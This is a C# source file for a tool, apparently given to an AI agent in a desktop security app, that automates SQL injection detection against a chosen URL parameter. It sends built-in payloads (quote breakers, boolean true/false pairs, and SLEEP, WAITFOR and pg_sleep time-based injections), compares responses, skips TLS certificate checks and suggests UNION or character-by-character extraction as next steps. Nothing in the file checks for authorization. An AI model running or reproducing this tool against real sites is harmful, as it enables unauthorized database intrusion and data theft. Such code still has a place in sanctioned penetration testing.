// 灵枢桌面版 —— SQL 注入探测
//
// `payload` 工具给的是素材清单，模型还得自己一条条手发、手工比对响应。
// 这个工具把那一步自动化：**同一组 payload 发出去，把响应差异摆出来**。
//
// ## 三个动作
//
//   probe   —— 判断有没有注入点：发基线 + 若干探测 payload，比状态码/长度/耗时
//   boolean —— 布尔盲注：用 true/false 两个条件，看响应是否稳定可分
//   time    —— 时间盲注：注入 SLEEP，量实际耗时差
//
// ## 边界
//
// **只做探测，不做提取**。它不会自动把库名表名拉出来——那需要按目标的具体
// 响应构造逐字符的判定，工具没法通用。这里负责的是「有没有洞、哪种洞」，
// 有了结论再让模型自己写后续请求。
//
// **不是扫描器**：一次只打一个参数，payload 数量有限，请求之间有间隔。
// 这是**探测**工具，不要拿它当压测或批量扫描用。

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SpiritScout.Tools
{
    public sealed class SqlTool : ITool
    {
        private static readonly HttpClient Http = CreateClient();

        private static HttpClient CreateClient()
        {
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
            }
            catch { }

            var handler = new HttpClientHandler
            {
                // 探测时证书多半不可信，不该因为证书看不到响应
                ServerCertificateCustomValidationCallback = delegate { return true; },
                AllowAutoRedirect = true,
                UseCookies = true,
            };
            var c = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
            c.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SpiritScout/2.0");
            return c;
        }

        public string Name { get { return "sql"; } }

        public string Description
        {
            get
            {
                return "SQL 注入探测（只判断有没有洞、哪种洞，不做数据提取）。"
                     + "actions: probe（基线对比，找响应差异）| boolean（布尔盲注是否可分）| time（时间盲注）。"
                     + "一次只测一个参数，请求间有间隔——**这是探测工具，不是扫描器**。";
            }
        }

        public string ParametersJson
        {
            get
            {
                return @"{
  ""type"": ""object"",
  ""properties"": {
    ""action"": { ""type"": ""string"", ""enum"": [""probe"", ""boolean"", ""time""], ""description"": ""做什么"" },
    ""url"": { ""type"": ""string"", ""description"": ""目标 URL（可含其它参数）"" },
    ""param"": { ""type"": ""string"", ""description"": ""要测的参数名"" },
    ""method"": { ""type"": ""string"", ""enum"": [""GET"", ""POST""], ""description"": ""默认 GET"" },
    ""payloads"": { ""type"": ""string"", ""description"": ""自定义 payload 列表（逗号分隔）；不给用内置"" },
    ""delay_ms"": { ""type"": ""integer"", ""description"": ""每次请求之间的间隔，默认 300"" },
    ""sleep_sec"": { ""type"": ""integer"", ""description"": ""time 动作的 SLEEP 秒数，默认 3"" }
  },
  ""required"": [""action"", ""url"", ""param""]
}";
            }
        }

        /// <summary>probe 用的探测 payload。成对出现（真/假条件）便于比对。</summary>
        private static readonly string[] ProbePayloads =
        {
            "'",                      // 单引号：看有没有报错
            "\"",                     // 双引号
            "' AND '1'='1",           // 恒真
            "' AND '1'='2",           // 恒假（和上面成对）
            "' OR '1'='1",            // 万能
            "1' AND 1=1-- -",
            "1' AND 1=2-- -",
            "1 AND 1=1",
            "1 AND 1=2",
            "')",                     // 括号闭合
            "'))-- -",
            "\\",                     // 反斜杠（MySQL 转义探针）
        };

        public async Task<ToolResult> InvokeAsync(IDictionary<string, object> args, CancellationToken ct)
        {
            string action = (Arg.Str(args, "action") ?? "").Trim().ToLowerInvariant();
            string url = (Arg.Str(args, "url") ?? "").Trim();
            string param = (Arg.Str(args, "param") ?? "").Trim();
            string method = (Arg.Str(args, "method") ?? "GET").Trim().ToUpperInvariant();
            string custom = Arg.Str(args, "payloads") ?? "";
            int delayMs = Arg.Int(args, "delay_ms", 300);
            int sleepSec = Arg.Int(args, "sleep_sec", 3);

            if (url.Length == 0) return ToolResult.Fail("url 不能为空");
            if (param.Length == 0) return ToolResult.Fail("param 不能为空");
            if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase)) url = "http://" + url;
            if (delayMs < 0) delayMs = 0;
            if (delayMs > 5000) delayMs = 5000;
            if (sleepSec < 1) sleepSec = 1;
            if (sleepSec > 30) sleepSec = 30;

            try
            {
                if (action == "probe") return await DoProbe(url, param, method, custom, delayMs, ct).ConfigureAwait(false);
                if (action == "boolean") return await DoBoolean(url, param, method, delayMs, ct).ConfigureAwait(false);
                if (action == "time") return await DoTime(url, param, method, sleepSec, ct).ConfigureAwait(false);
                return ToolResult.Fail("action 只能是 probe / boolean / time");
            }
            catch (Exception ex)
            {
                return ToolResult.Fail("探测失败：" + ex.Message);
            }
        }

        // ---------- probe ----------

        private async Task<ToolResult> DoProbe(string url, string param, string method,
            string custom, int delayMs, CancellationToken ct)
        {
            var payloads = new List<string>();
            if (!string.IsNullOrEmpty(custom))
            {
                foreach (var p in custom.Split(',')) if (p.Trim().Length > 0) payloads.Add(p.Trim());
            }
            else payloads.AddRange(ProbePayloads);

            // 基线：原值（用 param 的常见中值，或者空）
            var baseline = await Send(url, param, method, "1", ct).ConfigureAwait(false);
            if (!baseline.Ok) return ToolResult.Fail("基线请求失败：" + baseline.Error);

            var sb = new StringBuilder();
            sb.Append("目标 ").Append(method).Append(' ').Append(url).Append('\n');
            sb.Append("参数 ").Append(param).Append('\n');
            sb.Append("基线 : ").Append(baseline.Describe()).Append("\n\n");
            sb.Append("=== 探测结果 ===\n");

            var suspects = new List<string>();
            int n = 0;
            foreach (var p in payloads)
            {
                if (n++ > 0 && delayMs > 0) await Task.Delay(delayMs, ct).ConfigureAwait(false);

                var r = await Send(url, param, method, p, ct).ConfigureAwait(false);
                if (!r.Ok)
                {
                    sb.Append("  ").Append(Pad(p, 22)).Append(" → 请求失败：").Append(r.Error).Append('\n');
                    continue;
                }

                string diff = Diff(baseline, r);
                sb.Append("  ").Append(Pad(p, 22)).Append(" → ").Append(r.Describe()).Append(diff).Append('\n');

                if (diff.Length > 0 || r.HasError) suspects.Add(p);
            }

            sb.Append("\n=== 怎么读 ===\n");
            if (suspects.Count == 0)
            {
                sb.Append("所有 payload 的响应和基线一致 → 大概率没有注入（或者被 WAF 拦了但返回了同样的页）。\n");
                sb.Append("可以：换 param 试其它参数、试 POST、或先看有没有报错信息泄露。\n");
            }
            else
            {
                sb.Append("有 ").Append(suspects.Count).Append(" 个 payload 的响应和基线不同：\n");
                foreach (var s in suspects) sb.Append("    ").Append(s).Append('\n');
                sb.Append("\n响应不同**不等于**有洞——可能是参数值本身影响了页面内容。\n");
                sb.Append("关键看**成对**的 payload 有没有差异：\n");
                sb.Append("  `' AND '1'='1` 和 `' AND '1'='2` 的响应不同 → 布尔盲注，用 boolean 动作确认\n");
                sb.Append("  `1 AND 1=1` 和 `1 AND 1=2` 同理\n");
                sb.Append("  单个 `'` 就报错 → 可能有回显，直接构造 UNION\n");
            }

            return new ToolResult
            {
                Ok = true,
                Output = sb.ToString(),
                Summary = "probe · " + suspects.Count + " 个 payload 有响应差异",
            };
        }

        // ---------- boolean ----------

        private async Task<ToolResult> DoBoolean(string url, string param, string method, int delayMs, CancellationToken ct)
        {
            var pairs = new[]
            {
                new[] { "' AND '1'='1", "' AND '1'='2" },
                new[] { "1' AND 1=1-- -", "1' AND 1=2-- -" },
                new[] { "1 AND 1=1", "1 AND 1=2" },
                new[] { "1) AND 1=1-- -", "1) AND 1=2-- -" },
            };

            var sb = new StringBuilder();
            sb.Append("目标 ").Append(method).Append(' ').Append(url).Append(" · 参数 ").Append(param).Append("\n\n");
            sb.Append("=== 布尔盲注可分性 ===\n");

            bool anySplit = false;
            foreach (var pair in pairs)
            {
                var rTrue = await Send(url, param, method, pair[0], ct).ConfigureAwait(false);
                if (delayMs > 0) await Task.Delay(delayMs, ct).ConfigureAwait(false);
                var rFalse = await Send(url, param, method, pair[1], ct).ConfigureAwait(false);
                if (delayMs > 0) await Task.Delay(delayMs, ct).ConfigureAwait(false);

                if (!rTrue.Ok || !rFalse.Ok)
                {
                    sb.Append("  ").Append(Pad(pair[0], 22)).Append(" 请求失败\n");
                    continue;
                }

                bool same = Math.Abs(rTrue.Length - rFalse.Length) <= 5
                            && rTrue.Status == rFalse.Status
                            && (rTrue.HasMarker == rFalse.HasMarker);

                sb.Append("  ").Append(Pad(pair[0], 22)).Append(" → ")
                  .Append(rTrue.Describe()).Append('\n');
                sb.Append("  ").Append(Pad(pair[1], 22)).Append(" → ")
                  .Append(rFalse.Describe()).Append('\n');
                if (same)
                {
                    sb.Append("     两者几乎一致 → 这组不能用作布尔判定\n\n");
                }
                else
                {
                    sb.Append("     **可分** —— 长度差 ").Append(Math.Abs(rTrue.Length - rFalse.Length))
                      .Append(" 字节，可用作逐字符判定\n\n");
                    anySplit = true;
                }
            }

            if (anySplit)
            {
                sb.Append("结论：有至少一组 true/false 响应可分。\n");
                sb.Append("下一步（模型自己构造，工具不代做）：\n");
                sb.Append("  · 把条件换成 SUBSTR((SELECT ...),1,1)='a' 逐字符猜\n");
                sb.Append("  · 或换成 (SELECT ASCII(SUBSTR(...)))>64 做二分\n");
            }
            else
            {
                sb.Append("结论：所有组的 true/false 响应都一致 → 布尔盲注不可行（或过滤很严）。\n");
                sb.Append("可以试 time 动作看时间盲注。\n");
            }

            return new ToolResult
            {
                Ok = true,
                Output = sb.ToString(),
                Summary = "boolean · " + (anySplit ? "有可分组合" : "都不可分"),
            };
        }

        // ---------- time ----------

        private async Task<ToolResult> DoTime(string url, string param, string method, int sleepSec, CancellationToken ct)
        {
            var cases = new[]
            {
                new[] { "1' AND SLEEP(" + sleepSec + ")-- -", "MySQL" },
                new[] { "1 AND SLEEP(" + sleepSec + ")", "MySQL（数字型）" },
                new[] { "1'; SELECT SLEEP(" + sleepSec + ")-- -", "MySQL（堆叠）" },
                new[] { "1' WAITFOR DELAY '0:0:" + sleepSec + "'-- -", "MSSQL" },
                new[] { "1'; SELECT pg_sleep(" + sleepSec + ")-- -", "PostgreSQL" },
                new[] { "1' AND (SELECT 1 FROM (SELECT SLEEP(" + sleepSec + "))x)-- -", "MySQL（子查询）" },
            };

            // 先测基线耗时
            var sw = Stopwatch.StartNew();
            var baseR = await Send(url, param, method, "1", ct).ConfigureAwait(false);
            sw.Stop();
            long baseMs = sw.ElapsedMilliseconds;
            if (!baseR.Ok) return ToolResult.Fail("基线请求失败：" + baseR.Error);

            var sb = new StringBuilder();
            sb.Append("目标 ").Append(method).Append(' ').Append(url).Append(" · 参数 ").Append(param).Append('\n');
            sb.Append("基线耗时 ").Append(baseMs).Append(" ms · SLEEP ").Append(sleepSec).Append(" 秒\n\n");
            sb.Append("=== 时间盲注 ===\n");

            long threshold = baseMs + sleepSec * 1000 / 2;
            bool hit = false;

            foreach (var c in cases)
            {
                sw.Restart();
                var r = await Send(url, param, method, c[0], ct).ConfigureAwait(false);
                sw.Stop();
                long ms = sw.ElapsedMilliseconds;

                string mark = "";
                if (ms >= threshold)
                {
                    mark = "  ← **延迟 " + (ms - baseMs) + "ms，疑似生效**";
                    hit = true;
                }
                sb.Append("  ").Append(Pad(c[1], 18)).Append(" ").Append(ms).Append(" ms").Append(mark).Append('\n');
                sb.Append("      ").Append(Clip(c[0], 90)).Append('\n');

                if (ms > 2000) await Task.Delay(200, ct).ConfigureAwait(false);
            }

            sb.Append('\n');
            if (hit)
            {
                sb.Append("结论：有 payload 让响应明显变慢 → 时间盲注可行。\n");
                sb.Append("注意：慢也可能是网络抖动。**同一个 payload 连发 3 次都慢**才算数。\n");
            }
            else
            {
                sb.Append("结论：没有明显延迟 → 时间盲注大概率不可行。\n");
                sb.Append("也可能是 SLEEP 被过滤；试试 BENCHMARK()、或换函数名大小写。\n");
            }

            return new ToolResult
            {
                Ok = true,
                Output = sb.ToString(),
                Summary = "time · " + (hit ? "有延迟响应" : "无延迟"),
            };
        }

        // ---------- HTTP ----------

        private sealed class Resp
        {
            public bool Ok;
            public string Error;
            public int Status;
            public int Length;
            public long Ms;
            public string Body;
            public bool HasError;      // 响应体里有 SQL 报错特征
            public bool HasMarker;     // 明显的成功/失败标志词

            public string Describe()
            {
                var sb = new StringBuilder();
                sb.Append("HTTP ").Append(Status).Append(" · ").Append(Length).Append(" 字节 · ")
                  .Append(Ms).Append("ms");
                if (HasError) sb.Append(" · **含报错特征**");
                return sb.ToString();
            }
        }

        private static async Task<Resp> Send(string url, string param, string method, string value, CancellationToken ct)
        {
            var r = new Resp();
            var sw = Stopwatch.StartNew();
            try
            {
                HttpResponseMessage resp;
                if (method == "POST")
                {
                    var content = new StringContent(param + "=" + Uri.EscapeDataString(value),
                        Encoding.UTF8, "application/x-www-form-urlencoded");
                    resp = await Http.PostAsync(url, content, ct).ConfigureAwait(false);
                }
                else
                {
                    string full = AppendQuery(url, param, value);
                    resp = await Http.GetAsync(full, HttpCompletionOption.ResponseHeadersRead, ct).ConfigureAwait(false);
                }

                using (resp)
                {
                    r.Status = (int)resp.StatusCode;
                    string body = "";
                    try { body = await ToolIo.ReadCappedAsync(resp, 128 * 1024).ConfigureAwait(false); }
                    catch { }
                    r.Body = body ?? "";
                    r.Length = r.Body.Length;
                    r.Ok = true;
                }
            }
            catch (Exception ex)
            {
                r.Ok = false;
                r.Error = ex.Message;
                r.Status = -1;
            }
            sw.Stop();
            r.Ms = sw.ElapsedMilliseconds;

            if (r.Ok)
            {
                r.HasError = ContainsAny(r.Body,
                    "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite/JDBCDriver",
                    "Microsoft OLE DB", "ODBC SQL Server", "Unclosed quotation mark",
                    "You have an error in your SQL syntax", "Warning: mysql_",
                    "quoted string not properly terminated");
                r.HasMarker = ContainsAny(r.Body, "welcome", "success", "logged in", "flag");
            }
            return r;
        }

        private static string AppendQuery(string url, string key, string value)
        {
            string sep = url.IndexOf('?') >= 0 ? "&" : "?";
            // 如果已经有同名参数，替换它
            if (System.Text.RegularExpressions.Regex.IsMatch(url, "[?&]" + System.Text.RegularExpressions.Regex.Escape(key) + "="))
            {
                return System.Text.RegularExpressions.Regex.Replace(url,
                    "([?&])" + System.Text.RegularExpressions.Regex.Escape(key) + "=[^&]*",
                    "$1" + key + "=" + Uri.EscapeDataString(value));
            }
            return url + sep + key + "=" + Uri.EscapeDataString(value);
        }

        private static string Diff(Resp baseline, Resp now)
        {
            var parts = new List<string>();
            if (now.Status != baseline.Status) parts.Add("状态码 " + baseline.Status + "→" + now.Status);
            int d = now.Length - baseline.Length;
            if (Math.Abs(d) > 5) parts.Add("长度 " + (d > 0 ? "+" : "") + d);
            if (now.HasError && !baseline.HasError) parts.Add("**出现报错特征**");
            if (now.HasMarker != baseline.HasMarker) parts.Add("标志词变化");
            return parts.Count == 0 ? "" : "  【" + string.Join(" · ", parts.ToArray()) + "】";
        }

        private static bool ContainsAny(string s, params string[] needles)
        {
            if (string.IsNullOrEmpty(s)) return false;
            foreach (var n in needles)
                if (s.IndexOf(n, StringComparison.OrdinalIgnoreCase) >= 0) return true;
            return false;
        }

        private static string Pad(string s, int n)
        {
            if (s == null) s = "";
            return s.Length >= n ? s : s + new string(' ', n - s.Length);
        }

        private static string Clip(string s, int n)
        {
            if (s == null) return "";
            return s.Length <= n ? s : s.Substring(0, n) + "…";
        }
    }
}
